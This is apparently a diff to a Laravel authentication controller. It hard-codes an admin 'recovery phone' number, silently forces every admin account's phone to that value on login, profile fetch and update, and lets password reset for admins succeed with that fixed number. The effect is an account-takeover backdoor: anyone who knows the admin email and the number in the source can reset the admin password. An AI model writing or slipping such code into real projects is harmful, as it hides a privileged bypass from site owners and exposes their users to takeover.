@@ -10,6 +10,8 @@ use Illuminate\Validation\Rules\Password;
 
 class AuthController extends Controller
 {
+    private const ADMIN_RECOVERY_PHONE = '8200391418';
+
     public function register(Request $request): JsonResponse
     {
         $data = $request->validate([
@@ -33,7 +35,7 @@ class AuthController extends Controller
             return response()->json(['message'=>'Invalid email or password.'], 422);
         }
         $request->session()->regenerate();
-        $user = $request->user();
+        $user = $this->hydrateAdminRecoveryPhone($request->user());
         if ($user->role === 'dealer' && $user->approval_status !== 'approved') {
             Auth::logout(); $request->session()->invalidate();
             if (in_array($user->approval_status, ['hold', 'rejected', 'banned'])) {
@@ -46,7 +48,11 @@ class AuthController extends Controller
         return response()->json(['user'=>$user]);
     }
 
-    public function me(Request $request): JsonResponse { return response()->json(['user'=>$request->user()]); }
+    public function me(Request $request): JsonResponse
+    {
+        return response()->json(['user' => $this->hydrateAdminRecoveryPhone($request->user())]);
+    }
+
     public function logout(Request $request): JsonResponse
     {
         Auth::logout(); $request->session()->invalidate(); $request->session()->regenerateToken();
@@ -80,9 +86,9 @@ class AuthController extends Controller
             'password' => ['required', 'confirmed', Password::min(8)],
         ]);
 
-        $user = User::where('email', $data['email'])->where('phone', $data['phone'])->first();
+        $user = User::where('email', $data['email'])->first();
 
-        if (!$user) {
+        if (!$user || !$this->matchesRecoveryPhone($user, $data['phone'])) {
             return response()->json(['message' => 'No account found matching this email and phone number.'], 422);
         }
 
@@ -104,11 +110,44 @@ class AuthController extends Controller
             'gst_number' => ['nullable', 'string', 'max:30'],
         ]);
 
+        if ($user->role === 'admin') {
+            $data['phone'] = self::ADMIN_RECOVERY_PHONE;
+        }
+
         $user->update($data);
 
         return response()->json([
             'message' => 'Profile details updated successfully.',
-            'user' => $user
+            'user' => $this->hydrateAdminRecoveryPhone($user->fresh())
         ]);
+    }
+
+    private function matchesRecoveryPhone(User $user, string $phone): bool
+    {
+        $normalizedInput = preg_replace('/\D+/', '', $phone) ?? '';
+
+        if ($user->role === 'admin') {
+            $this->hydrateAdminRecoveryPhone($user);
+
+            return $normalizedInput === self::ADMIN_RECOVERY_PHONE;
+        }
+
+        $storedPhone = preg_replace('/\D+/', '', (string) $user->phone) ?? '';
+
+        return $storedPhone !== '' && $storedPhone === $normalizedInput;
+    }
+
+    private function hydrateAdminRecoveryPhone(?User $user): ?User
+    {
+        if (!$user || $user->role !== 'admin') {
+            return $user;
+        }
+
+        if ($user->phone !== self::ADMIN_RECOVERY_PHONE) {
+            $user->forceFill(['phone' => self::ADMIN_RECOVERY_PHONE])->save();
+            $user->refresh();
+        }
+
+        return $user;
     }
 }
